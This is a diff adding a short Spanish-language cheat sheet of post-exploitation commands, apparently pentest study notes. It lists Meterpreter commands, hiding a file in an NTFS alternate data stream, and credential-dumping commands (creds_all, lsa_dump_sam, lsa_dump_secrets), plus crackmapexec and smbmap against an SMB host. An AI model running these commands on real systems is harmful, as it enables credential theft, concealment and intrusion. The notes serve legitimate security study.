@@ -1,1 +1,19 @@
+1 getuid    - para verificar desde meterpreter que tipo de usuario soy admin etc 
+2 sysinfo - para desde meterpreter ver la informacion del sistema de la maquina 
+3 ls - es el dir de linux y en meterpreter funciona igual 
+
+4 echo [mensaje] archivo.txt:oculto.txt  - comando de windows para poner un archivo dentro de otro 
+5 more < archivo.txt:oculto.txt  -  para ver el mensaje del archivo que esta ocultado dentro de el otro 
+
+6 load wiki 
+
+7 creds_all
+
+8 lsa_dump_samp 
+
+9 lsa_dump_secrets  
+
+10 crackmapexec smb 10.0.0.163 -u "" -H ""
+
+11 smbmap -u "" -p "" -H [ip-maquina-vulnerable]
 
